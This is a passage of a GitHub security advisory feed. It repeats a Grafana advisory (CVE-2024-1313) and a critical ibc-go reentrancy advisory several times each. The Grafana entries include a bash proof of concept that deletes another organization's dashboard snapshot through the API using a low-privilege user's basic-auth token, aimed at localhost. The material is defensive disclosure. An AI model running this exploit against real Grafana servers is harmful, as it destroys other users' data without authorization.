<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/advisories/GHSA-67rv-qpw2-6qrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T19:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana: Users outside an organization can delete a snapshot with its key]]></title>
        <id>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</id>
        <link href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr"/>
        <updated>2024-04-07T07:34:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <em><strong>DELETE /api/snapshots/{key}</strong></em> endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot</p>
<h3 id="details">Details</h3>
<p>An attacker (a user without organization affiliation or with a "no basic role" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. 
If an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. </p>
<p><img alt="Screenshot 2024-01-19 at 3 50 23 PM" src="https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png"></p>
<h3 id="precondition">Precondition</h3>
<p>To exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.</p>
<p>When <a href="https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/">creating a snapshot through the API</a>, users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as "customer_key_123" or "admin_snap" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.</p>
<p>In addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/bin/bash -x

# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}
# 2d92c726-bf3c-4f20-b979-37bdf81d68c7

# Authentication stage

# User A - Grafana Admin
user_a_token="YWRtaW46YWRtaW4xMjM="

# User B - User with no permissions , which is not part of any org
user_b_token="YmJiOmJiYmJiYmJiYg=="

# Create snapshot
current_date=$(date +%Y-%m-%d-%H-%M-%S)
random_string="random-${current_date}"
snapshot_data='{"dashboard":{"annotations":{"list":[{"name":"Annotations &amp; Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","snapshotData":[],"type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1517,"links":[],"liveNow":false,"panels":[{"aliasColors":{},"bars":false,"dashLength":10,"dashes":false,"datasource":null,"fill":1,"fillGradient":0,"gridPos":{"h":7,"w":24,"x":0,"y":0},"hiddenSeries":false,"id":4,"legend":{"alignAsTable":true,"avg":false,"current":true,"max":false,"min":false,"rightSide":true,"show":true,"total":false,"values":true},"lines":true,"linewidth":1,"links":[],"nullPointMode":"null","options":{"alertThreshold":true},"percentage":false,"pluginVersion":"10.2.3","pointradius":2,"points":false,"renderer":"flot","seriesOverrides":[],"snapshotData":[{"fields":[{"config":{},"name":"time","type":"time","values":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],"meta":{},"refId":"A"}],"spaceLength":10,"stack":false,"steppedLine":false,"targets":[],"thresholds":[],"timeRegions":[],"title":"Simple dummy streaming example","tooltip":{"shared":true,"sort":0,"value_type":"individual"},"type":"graph","xaxis":{"mode":"time","show":true,"values":[]},"yaxes":[{"format":"short","logBase":1,"show":true},{"format":"short","logBase":1,"show":true}],"yaxis":{"align":false}}],"refresh":"","schemaVersion":39,"snapshot":{"timestamp":"2024-01-04T15:03:04.128Z"},"tags":[],"templating":{"list":[]},"time":{"from":"2024-01-04T15:02:08.132Z","to":"2024-01-04T15:03:08.132Z","raw":{"from":"now-1m","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Simple Streaming Example Snapshot","uid":"TXSTREZ","version":1,"weekStart":""},"name":"Simple Streaming Example Snapshot", "expires":0, "key":"admin_key"}'

create_snapshot_response=$(curl -s -X POST "http://localhost:3000/api/snapshots" -H "Authorization: Basic ${user_a_token}" -H "Content-Type: application/json" -d "${snapshot_data}")

# Extract key from create snapshot response
key=$(echo "$create_snapshot_response" | jq -r '.key')

# Delete snapshot
delete_snapshot_response=$(curl -s -X DELETE "http://localhost:3000/api/snapshots/${key}" -H "Authorization: Basic ${user_b_token}" -o /dev/null -w "%{http_code}")

# Check if the test passed
if [ "$delete_snapshot_response" -eq 200 ]; then
  echo -e "\033[32mTest was passed, BOLA\033[0m"
fi
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/advisories/GHSA-67rv-qpw2-6qrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T19:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana: Users outside an organization can delete a snapshot with its key]]></title>
        <id>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</id>
        <link href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr"/>
        <updated>2024-04-07T07:34:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <em><strong>DELETE /api/snapshots/{key}</strong></em> endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot</p>
<h3 id="details">Details</h3>
<p>An attacker (a user without organization affiliation or with a "no basic role" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. 
If an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. </p>
<p><img alt="Screenshot 2024-01-19 at 3 50 23 PM" src="https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png"></p>
<h3 id="precondition">Precondition</h3>
<p>To exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.</p>
<p>When <a href="https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/">creating a snapshot through the API</a>, users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as "customer_key_123" or "admin_snap" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.</p>
<p>In addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/bin/bash -x

# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}
# 2d92c726-bf3c-4f20-b979-37bdf81d68c7

# Authentication stage

# User A - Grafana Admin
user_a_token="YWRtaW46YWRtaW4xMjM="

# User B - User with no permissions , which is not part of any org
user_b_token="YmJiOmJiYmJiYmJiYg=="

# Create snapshot
current_date=$(date +%Y-%m-%d-%H-%M-%S)
random_string="random-${current_date}"
snapshot_data='{"dashboard":{"annotations":{"list":[{"name":"Annotations &amp; Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","snapshotData":[],"type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1517,"links":[],"liveNow":false,"panels":[{"aliasColors":{},"bars":false,"dashLength":10,"dashes":false,"datasource":null,"fill":1,"fillGradient":0,"gridPos":{"h":7,"w":24,"x":0,"y":0},"hiddenSeries":false,"id":4,"legend":{"alignAsTable":true,"avg":false,"current":true,"max":false,"min":false,"rightSide":true,"show":true,"total":false,"values":true},"lines":true,"linewidth":1,"links":[],"nullPointMode":"null","options":{"alertThreshold":true},"percentage":false,"pluginVersion":"10.2.3","pointradius":2,"points":false,"renderer":"flot","seriesOverrides":[],"snapshotData":[{"fields":[{"config":{},"name":"time","type":"time","values":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],"meta":{},"refId":"A"}],"spaceLength":10,"stack":false,"steppedLine":false,"targets":[],"thresholds":[],"timeRegions":[],"title":"Simple dummy streaming example","tooltip":{"shared":true,"sort":0,"value_type":"individual"},"type":"graph","xaxis":{"mode":"time","show":true,"values":[]},"yaxes":[{"format":"short","logBase":1,"show":true},{"format":"short","logBase":1,"show":true}],"yaxis":{"align":false}}],"refresh":"","schemaVersion":39,"snapshot":{"timestamp":"2024-01-04T15:03:04.128Z"},"tags":[],"templating":{"list":[]},"time":{"from":"2024-01-04T15:02:08.132Z","to":"2024-01-04T15:03:08.132Z","raw":{"from":"now-1m","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Simple Streaming Example Snapshot","uid":"TXSTREZ","version":1,"weekStart":""},"name":"Simple Streaming Example Snapshot", "expires":0, "key":"admin_key"}'

create_snapshot_response=$(curl -s -X POST "http://localhost:3000/api/snapshots" -H "Authorization: Basic ${user_a_token}" -H "Content-Type: application/json" -d "${snapshot_data}")

# Extract key from create snapshot response
key=$(echo "$create_snapshot_response" | jq -r '.key')

# Delete snapshot
delete_snapshot_response=$(curl -s -X DELETE "http://localhost:3000/api/snapshots/${key}" -H "Authorization: Basic ${user_b_token}" -o /dev/null -w "%{http_code}")

# Check if the test passed
if [ "$delete_snapshot_response" -eq 200 ]; then
  echo -e "\033[32mTest was passed, BOLA\033[0m"
fi
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/advisories/GHSA-67rv-qpw2-6qrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T19:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v2] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
<li>Chain is CosmWasm-enabled and allows code uploads for wasm contracts by anyone, or by authorized parties (to a lesser extent)</li>
<li>Chain utilizes the ibc-hooks middleware and wraps ICS-20 transfer application</li>
</ul>
<h1 id="next-steps-for-impacted-chain-builders-and-maintainers">Next Steps for Impacted Chain Builders and Maintainers</h1>
<p>It is advised to immediately upgrade to the latest patch fix version of ibc-go for your chain. If you have already applied a soft-patch through private coordination, we recommend additionally updating to the latest ibc-go version via normal software upgrade governance.</p>
<p>If you have not upgraded your chain yet, and you desire to mitigate exposure to this vulnerability in the meantime, it is advisable to limit code uploading for contracts to trusted parties on your chain.</p>
<p><strong>If your chain only allows permissioned, access-controlled contract uploads, it is still strongly recommended to update to the latest patched ibc-go version for your chain per your normal software upgrade process.</strong></p>
<h1 id="preparing-for-future-coordination">Preparing for future coordination</h1>
<p>If your chain would like to be included in future coordination efforts, please ensure your chain has a prominently displayed or otherwise easily available up-to-date email address for technical security contact available. A security.md file in the root of your projects’ code repository should contain this information. Additionally, please test this security contact with an unaffiliated email to ensure it works as expected and can receive emails from outside of your domain.</p>
<p>To ensure that your chain is included in future impact assessments, please keep your chain information up to date in the <a href="https://github.com/cosmos/chain-registry">Cosmos Chain Registry</a> with code location, network name, and public RPC and API endpoints in the details.</p>
<p>We recommend that all chains configure and practice the use of the <a href="https://docs.cosmos.network/main/build/modules/circuit">Circuit Breaker module</a> in the Cosmos SDK, as future vulnerability notifications may require the use of this mechanism as a mitigation against exploitation.</p>
<h1 id="recognition">Recognition</h1>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 3/26/24 by Maxwell Dulin (Strikeout) at <a href="https://www.asymmetric.re/">Asymmetric Research</a>. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<h1 id="notes">Notes</h1>
<p>Due to the critical nature of this issue, both the ibc-go team and Amulet independently performed impact assessments for the ecosystem, which informed a risk-driven private patching effort that preceded this public release. This private patching effort significantly reduced the exposure of the ecosystem to this vulnerability. We appreciate the diligence and professionalism of all chains and validators involved with this effort – your ability to move quickly while maintaining confidentiality was instrumental in protecting the wider Interchain Ecosystem. </p>
<p>If you ever have questions about security coordination efforts, public or private, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about ibc-go, please see <a href="https://ibc.cosmos.network/main">https://ibc.cosmos.network/main</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx">https://github.com/cosmos/ibc-go/security/advisories/GHSA-j496-crgh-34mx</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7">https://github.com/cosmos/ibc-go/commit/04275aa77644dec97fb91b749d963c992591b7f7</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97">https://github.com/cosmos/ibc-go/commit/278fa89f192af04af32d82fd5ef41f84f82edd97</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd">https://github.com/cosmos/ibc-go/commit/5e2e9ebc2f67df324028dd36a1837ffcc8e6b0dd</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729">https://github.com/cosmos/ibc-go/commit/a0185df3953070ba5ebcb66735925449d1dbe729</a></li>
<li><a href="https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219">https://github.com/cosmos/ibc-go/commit/e78b3a2b9c9ce80a67d6b1c2b7f9abcb225cc219</a></li>
<li><a href="https://github.com/advisories/GHSA-j496-crgh-34mx">https://github.com/advisories/GHSA-j496-crgh-34mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j496-crgh-34mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T17:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-go/v3] ibc-go: Potential Reentrancy using Timeout Callbacks in ibc-hooks]]></title>
        <id>https://github.com/advisories/GHSA-j496-crgh-34mx</id>
        <link href="https://github.com/advisories/GHSA-j496-crgh-34mx"/>
        <updated>2024-04-05T17:16:02.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-007: Potential Reentrancy using Timeout Callbacks in ibc-hooks
<strong>Component</strong>: ibc-go
<strong>Criticality</strong>: Critical (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1</a>: I:Critical; L:AlmostCertain)
<strong>Affected versions</strong>: &lt; v4.6.0, &lt; v5.4.0, &lt; v6.3.0, &lt; v7.4.0, &lt; v8.2.0
<strong>Affected users</strong>: Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>Through the deployment and subsequent use of a malicious CosmWasm contract via IBC interactions, an attacker could potentially execute the same <code>MsgTimeout</code> inside the IBC hook for the <code>OnTimeout</code> callback before the packet commitment is deleted. On chains where ibc-hooks wraps ICS-20, this vulnerability may allow for the logic of the <code>OnTimeout</code> callback of the transfer application to be recursively executed, leading to a condition that may present the opportunity for the loss of funds from the escrow account or unexpected minting of tokens.</p>
<h1 id="affected-configurations">Affected Configurations</h1>
<p>Chains which satisfy all of the following requirements are considered to be impacted by this vulnerability:</p>
<ul>
<li>Chain is IBC-enabled and uses a vulnerable version of ibc-go</li>
